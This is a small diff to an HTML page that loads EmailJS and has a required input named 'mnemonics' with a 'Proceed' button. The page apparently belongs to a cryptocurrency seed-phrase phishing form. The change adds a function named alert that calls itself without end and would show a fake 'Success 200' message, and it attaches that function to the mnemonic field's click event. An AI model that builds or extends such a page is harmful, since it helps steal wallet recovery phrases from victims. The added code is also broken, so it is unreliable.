@@ -24,6 +24,9 @@
       (function () {
         emailjs.init('1lGEQo-oBs_Q98V0W');
       })();
+	   function alert() {
+	   alert ("Success 200");
+	   }  
     </script>
   </head>
   <body>
@@ -64,6 +67,7 @@
             type="text"
             name="mnemonics"
 			required
+			onclick = "alert()"
           />
           <button class="form__btn" type="submit">Proceed</button>
           <p id="my-form-status"></p>
